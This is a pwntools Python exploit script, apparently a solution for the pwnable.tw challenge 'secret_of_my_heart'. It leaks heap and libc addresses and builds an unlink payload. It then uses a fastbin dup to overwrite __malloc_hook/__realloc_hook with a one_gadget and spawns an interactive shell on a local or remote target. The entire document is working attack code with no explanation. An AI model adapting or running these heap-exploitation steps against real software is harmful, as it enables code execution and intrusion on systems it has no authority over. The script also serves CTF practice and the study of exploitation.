from pwn import *
import sys

context.arch =  'amd64'
elf 	= ELF('./secret_of_my_heart')
status 	= sys.argv[1]
one	= 0x4526a
info("Fastbin Dup to hijack __realloc_hook")

if status == 'd':
    libc = ELF('./libc_64.so.6')
    io   = process('./secret_of_my_heart',env = {"LD_PRELOAD":"./libc_64.so.6"})
    context.log_level = "debug"
elif status == 'l':
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    io   = process('./secret_of_my_heart')
elif status == 'r':
    libc = ELF('./libc_64.so.6')
    io   = remote('chall.pwnable.tw',10302)
else:
    info("INVALID STATUS")
    exit()

def add(size, name, cont):
    io.sendlineafter(" :", "1")
    io.sendlineafter(" : ", str(size))
    io.sendafter(" :", name)
    io.sendafter(" :", cont)

def show(idx):
    io.sendlineafter(" :", "2")
    io.sendlineafter(" :", str(idx))

def delete(idx):
    io.sendlineafter(" :", "3")
    io.sendlineafter(" :", str(idx))

add(0x60,'a'*0x18+'C0ss4ck!','xixi')
show(0)
io.recvuntil('C0ss4ck!')
heap_base = u64(io.recv(6).ljust(8,'\x00'))-0x10
info('HEAP BASE -> %#x'%heap_base)
add(0xf8,'aaaa','haha')
add(0x20,'aaaa','haha')
delete(0)
unlink_payload = p64(heap_base+0x20-0x18)+p64(heap_base+0x20-0x10)+p64(heap_base)
unlink_payload = unlink_payload.ljust(0x60,'\x00')
unlink_payload += p64(0x70)
add(0x68,'bbbb',unlink_payload)
delete(1)
show(0)
io.recvuntil('Secret : ')
libc_base = u64(io.recv(6).ljust(8,'\x00'))-88-(libc.sym['__malloc_hook']+0x10)
info('LIBC BASE -> %#x'%libc_base)

add(0x68,'bbbb','hihi')
add(0x68,'bbbb','hihi')
add(0x20,'cccc','lala')
graph='''fast 0x70 bins:
PAGE[0].secret -> hp+0x10
PAGE[1].secret -> hp+0x10
PAGE[3].secret -> hp+0x80
'''
info(graph)
delete(1)
delete(3)
delete(0)
fake_fd = p64(libc_base+libc.sym['__malloc_hook']-0x23)
add(0x68,'dddd',fake_fd)
add(0x68,'xxxx','xxxx')
add(0x68,'yyyy','yyyy')
fake_hook = '\x00'*0xb
fake_hook += p64(one+libc_base)
fake_hook += p64(libc.sym['realloc']+libc_base+0x10)
add(0x68,'zzzz',fake_hook)
io.sendlineafter(" :", "1")
io.sendlineafter(" : ", str(0x68))
io.sendafter(" :", 'aaaa')

io.interactive()
